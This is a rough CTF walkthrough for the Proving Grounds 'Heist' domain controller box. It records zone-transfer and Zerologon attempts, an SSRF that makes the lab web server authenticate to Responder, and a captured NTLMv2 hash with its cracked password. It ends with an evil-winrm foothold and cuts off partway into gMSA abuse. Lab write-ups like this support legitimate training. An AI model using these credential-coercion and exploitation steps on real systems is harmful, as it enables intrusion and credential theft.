### Writeup
* https://juggernaut-sec.com/proving-grounds-heist/
* https://juggernaut-sec.com/pass-the-hash-attacks/

### Enumerating Services Specific to a Domain Controller
##### Zone Transfer since port 53 is open and is hosting a DNS over TCP - version: Simple DNS Plus
```bash
dig @$IP AXFR heist.offsec
dnsenum $IP
```

##### SMB, RPC and ldapsearch for nothing
##### AS-REP Roasting without user got error as well
##### Kerbrute attempt nothing
##### Quick win with Zerologon nothing https://github.com/A1vinSmith/zerologon
`python3 set_empty_pw.py DC01 $IP`

### Web Server Enumeration and exploiting an SSRF Vulnerability with Responder
```bash
python3 -m http.server 80
and test attacker's ip in port 80
http://192.168.217.165:8080/?url=http%3A%2F%2F192.168.49.217
```

Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example, clicking cmd.bat brings us to 192.168.194.165:8080/readme.md, which obviously doesn’t exist.

However, by adding the filename in the initial search it reads the file I select but does not execute it.

http://192.168.217.165:8080/?url=http%3A%2F%2F192.168.49.217%2FREADME.md

It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting:

“In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.”

    A specific tool that can be used to intercept authorization credentials when an arbitrary connection is made to a system is Responder. 

With this information, we should be able to setup Responder to create a spoofed WPAD proxy server and then search for an arbitrary domain using the URL search bar on the web server. After the request is made, we should see responder intercept the request and dump the hash of the user who owns the webserver.

Fire up Responder with the following command: 
```bash
sudo responder -I tun0 -wv
```

Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.

In my case, 80 not working. So I need to try 445 instead. But failed. So have to stop server on 80 first then use it to get hash.

```
[+] Listening for events...

[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
[HTTP] Sending NTLM authentication request to 192.168.217.165
[HTTP] GET request from: ::ffff:192.168.217.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.217.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:4eca8930408f0400:1D2C63A8BD99E59E7DFDCAF84BD4EDEC:0101000000000000D27C3582FEC3D801FBF3AFB7A91AE19200000000020008005600420037004A0001001E00570049004E002D004400570059005800390034004A003700580036003700040014005600420037004A002E004C004F00430041004C0003003400570049004E002D004400570059005800390034004A0037005800360037002E005600420037004A002E004C004F00430041004C00050014005600420037004A002E004C004F00430041004C000800300030000000000000000000000000300000ABE43A658DDF95DA092DD386067E84A63EE102BDD34B4623E24F825BF3A5145B0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340039002E003200310037000000000000000000
```

### Foothold
`evil-winrm -i 192.168.217.165 -u enox -p california`

This shows that the svc_apache service account can read the GMSA password, which means that the svc_apache account is a Group Managed Service Account (gMSA).

    Group managed service accounts (gMSAs) are managed domain accounts that you use to help secure services. After you configure your services to use a gMSA principal, password management for that account is handled by the Windows operating system.

Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled:













